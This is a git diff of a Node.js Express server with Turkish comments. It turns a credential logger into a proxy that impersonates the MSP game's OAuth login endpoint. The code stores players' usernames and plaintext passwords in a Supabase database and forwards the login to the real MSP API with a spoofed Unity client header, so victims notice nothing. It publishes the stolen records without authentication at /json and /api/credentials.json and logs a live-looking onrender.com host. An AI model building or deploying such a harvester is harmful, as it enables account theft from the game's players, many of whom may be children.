@@ -1,67 +1,30 @@
 const express = require('express');
 const cors = require('cors');
-const path = require('path');
-const fs = require('fs').promises;
-const crypto = require('crypto');
+const db = require('./lib/supabase');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
-const DATA_FILE = path.join('/tmp', 'login-attempts.json');
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Veri dosyasını oluştur
-async function initDataFile() {
-  try {
-    await fs.access(DATA_FILE);
-  } catch {
-    await fs.writeFile(DATA_FILE, JSON.stringify([]));
-  }
-}
-
-// Login denemelerini oku
-async function readLoginAttempts() {
-  try {
-    const data = await fs.readFile(DATA_FILE, 'utf8');
-    return JSON.parse(data);
-  } catch {
-    return [];
-  }
-}
-
-// Login denemelerini kaydet
-async function saveLoginAttempt(username, password, jwt = null) {
-  const attempts = await readLoginAttempts();
-  const newAttempt = {
-    id: crypto.randomUUID(),
-    username,
-    password,
-    jwt: jwt ? 'TOKEN_SAVED' : null,
-    timestamp: new Date().toISOString()
-  };
-  
-  attempts.unshift(newAttempt);
-  
-  // Son 100 denemeyi tut
-  if (attempts.length > 100) {
-    attempts.splice(100);
-  }
-  
-  await fs.writeFile(DATA_FILE, JSON.stringify(attempts, null, 2));
-  return newAttempt;
-}
-
 // Ana sayfa
 app.get('/', (req, res) => {
   res.json({ 
-    message: 'OAuth Token Proxy Server',
+    message: 'OAuth Token Proxy Server (Database Version) - MSP API Proxy',
     endpoints: {
+      proxy: '/loginidentity/connect/token - POST OAuth token proxy (MSP API)',
       save: '/save - POST username, password, jwt kaydetmek için',
       json: '/json - Kaydedilen verileri görüntüle',
-      api: '/api/credentials.json - Ham JSON verisi'
+      api: '/api/credentials.json - Ham JSON verisi',
+      health: '/health - Server durumu'
+    },
+    usage: {
+      msp_api: 'POST /loginidentity/connect/token ile MSP API\'sine proxy yapın',
+      credentials: 'Username ve password otomatik olarak kaydedilir',
+      view_data: 'GET /json ile kaydedilen verileri görüntüleyin'
     },
     timestamp: new Date().toISOString()
   });
@@ -86,7 +49,7 @@ app.post('/save', async (req, res) => {
   }
   
   try {
-    const saved = await saveLoginAttempt(username, password, jwt);
+    const saved = await db.saveLoginAttempt(username, password, jwt);
     console.log('✅ Veri başarıyla kaydedildi:', saved.id);
     
     res.json({ 
@@ -101,10 +64,72 @@ app.post('/save', async (req, res) => {
   }
 });
 
+// OAuth Token Proxy Endpoint - Gerçek API'yi taklit eder
+app.post('/loginidentity/connect/token', async (req, res) => {
+  const { username, password, client_id, client_secret, grant_type, scope, acr_values } = req.body;
+  
+  console.log('🔐 OAuth Token isteği yakalandı:', {
+    username: username || 'YOK',
+    password: password ? '****' : 'YOK',
+    client_id: client_id || 'YOK',
+    grant_type: grant_type || 'YOK',
+    timestamp: new Date().toISOString()
+  });
+  
+  // Username ve password varsa kaydet
+  if (username && password) {
+    try {
+      const saved = await db.saveLoginAttempt(username, password, null);
+      console.log('✅ Login bilgileri kaydedildi:', saved.id);
+    } catch (error) {
+      console.error('❌ Kaydetme hatası:', error);
+    }
+  }
+  
+  // Gerçek API'ye istek gönder
+  try {
+    const fetch = (await import('node-fetch')).default;
+    const response = await fetch('https://eu-secure.mspapis.com/loginidentity/connect/token', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'UnityPlayer/2022.3.21f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)',
+        'Accept': '*/*',
+        'Accept-Encoding': 'deflate, gzip'
+      },
+      body: new URLSearchParams({
+        client_id: client_id || 'unity.client',
+        client_secret: client_secret || 'secret',
+        grant_type: grant_type || 'password',
+        scope: scope || 'openid nebula offline_access',
+        username: username || '',
+        password: password || '',
+        acr_values: acr_values || ''
+      })
+    });
+    
+    const data = await response.text();
+    
+    // Response'u client'a geri gönder
+    res.status(response.status);
+    res.set(response.headers.raw());
+    res.send(data);
+    
+    console.log('📤 API yanıtı gönderildi:', response.status);
+    
+  } catch (error) {
+    console.error('❌ API Proxy hatası:', error);
+    res.status(500).json({ 
+      error: 'connection_error',
+      error_description: 'Bağlantı hatası oluştu'
+    });
+  }
+});
+
 // JSON formatında verileri görüntüle (web sayfası)
 app.get('/json', async (req, res) => {
   try {
-    const attempts = await readLoginAttempts();
+    const attempts = await db.getLoginAttempts();
     
     const html = `
     <!DOCTYPE html>
@@ -188,8 +213,8 @@ app.get('/json', async (req, res) => {
     <body>
         <div class="container">
             <div class="header">
-                <h1>🔐 KAYDEDİLEN VERİLER</h1>
-                <p>Kullanıcı Adı ve Şifre Kayıtları</p>
+                <h1>🔐 KAYDEDİLEN VERİLER (DATABASE)</h1>
+                <p>Kullanıcı Adı ve Şifre Kayıtları - Kalıcı Depolama</p>
                 <button class="refresh-btn" onclick="window.location.reload()">🔄 Yenile</button>
             </div>
             
@@ -241,7 +266,7 @@ app.get('/json', async (req, res) => {
 // Ham JSON endpoint
 app.get('/api/credentials.json', async (req, res) => {
   try {
-    const attempts = await readLoginAttempts();
+    const attempts = await db.getLoginAttempts();
     res.setHeader('Content-Type', 'application/json');
     res.json(attempts);
   } catch (error) {
@@ -253,6 +278,8 @@ app.get('/api/credentials.json', async (req, res) => {
 app.get('/health', (req, res) => {
   res.json({ 
     status: 'OK', 
+    database: 'Connected',
+    storage: 'Supabase PostgreSQL',
     timestamp: new Date().toISOString(),
     uptime: process.uptime()
   });
@@ -260,16 +287,25 @@ app.get('/health', (req, res) => {
 
 // Sunucuyu başlat
 async function startServer() {
-  await initDataFile();
+  // Test database connection
+  const dbConnected = await db.testConnection();
+  if (!dbConnected) {
+    console.error('❌ Database connection failed. Please check your Supabase configuration.');
+    process.exit(1);
+  }
   
   app.listen(PORT, () => {
-    console.log(`🚀 Server çalışıyor: ${PORT}`);
-    console.log(`📊 Veriler: http://localhost:${PORT}/json`);
-    console.log(`💾 Kaydetme: POST http://localhost:${PORT}/save`);
+    console.log(`🚀 MSP OAuth Proxy Server çalışıyor: ${PORT}`);
+    console.log(`🔐 MSP API Proxy: POST https://accounts-vxlw.onrender.com/loginidentity/connect/token`);
+    console.log(`📊 Veriler: https://accounts-vxlw.onrender.com/json`);
+    console.log(`💾 Kaydetme: POST https://accounts-vxlw.onrender.com/save`);
+    console.log(`🗄️  Database: Supabase PostgreSQL (Kalıcı Depolama)`);
     console.log('');
-    console.log('📝 Kullanım:');
-    console.log('POST /save ile username, password, jwt gönder');
-    console.log('GET /json ile kaydedilen verileri gör');
+    console.log('📝 MSP API Proxy Kullanımı:');
+    console.log('1. MSP uygulamasını bu sunucuya yönlendirin');
+    console.log('2. POST /loginidentity/connect/token endpoint\'ini kullanın');
+    console.log('3. Username ve password otomatik kaydedilir');
+    console.log('4. GET /json ile kaydedilen verileri görün');
   });
 }
 
